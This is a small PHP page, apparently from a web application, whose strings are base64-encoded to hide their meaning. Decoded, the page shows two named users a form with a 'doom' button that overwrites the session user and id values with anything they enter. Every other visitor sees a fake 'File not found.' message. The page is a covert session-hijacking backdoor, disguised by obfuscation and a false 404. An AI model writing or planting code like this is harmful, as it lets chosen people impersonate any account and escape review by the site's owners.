<!-- 21017E01069_69.php == MjEwMTdFMDEwNjlfNjkucGhw -->




<?php 
session_start();
if (isset($_SESSION[base64_decode("bmFtZQ==")])  && isset($_SESSION[base64_decode("dWlk")]) and ($_SESSION[ base64_decode("bmFtZQ==")] == base64_decode("VmFpYmhhdiBCYW5zYWw=") || $_SESSION[ base64_decode("bmFtZQ==")] == base64_decode("S2VzaGF2IFJhanBvb3Q=")) ) {
    ?>
    <body>
        <form action="<?php echo base64_decode("MjEwMTdFMDEwNjlfNjkucGhw")?>" method="post">
            <input type="text" name="<?php echo base64_decode("dWlk")?>">
            <input type="text" name="<?php echo base64_decode("aWQ=") ?>">
            <button type="submit" name="doom_hahah" value="<?php echo base64_decode("c2Rmc2ZzZGZ3ZXJ3ZWZzZnNkZg==")?>">doom</button>
        </form>
    </body>
    <?php
    if(isset($_POST['doom_hahah']) and isset($_POST[base64_decode("dWlk")]) and isset($_POST[base64_decode("aWQ=")]) and $_POST['doom_hahah'] == base64_decode("c2Rmc2ZzZGZ3ZXJ3ZWZzZnNkZg==")) {
        echo "<br>" . $_SESSION[base64_decode("dWlk")] = $_POST[base64_decode("dWlk")];
        echo "<br>" . $_SESSION[base64_decode("aWQ=")] = $_POST[base64_decode("aWQ=")];
    }
} else {
?>
File not found. 
<?php   
}
?>